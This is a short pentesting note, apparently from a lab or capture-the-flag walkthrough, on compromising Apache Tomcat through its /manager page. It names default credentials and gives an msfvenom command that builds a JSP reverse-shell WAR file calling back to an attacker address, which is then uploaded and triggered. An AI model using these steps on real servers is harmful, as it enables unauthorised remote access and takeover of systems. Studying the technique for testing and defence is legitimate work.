---
title: Tomcat 🐱
---
## `/manager` directory

If you discovered the presence of this directory, you can connect to it with identification

> Sometimes it might have default creds: `tomcat:s3cret`

![](Pasted%20image%2020240510010000.png)

Once here, you must upload a `.war` jsp reverse shell.

To create this shell, you can use msfvenom:

```shell
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.11.74.136 lport=666 -f war -o shell.war
```

Then you will upload it:

![](Pasted%20image%2020240510010146.png)

Now, as it deploys it automatically, you must click on `/shell` and you've got a reverse shell:

![](Pasted%20image%2020240510010253.png)

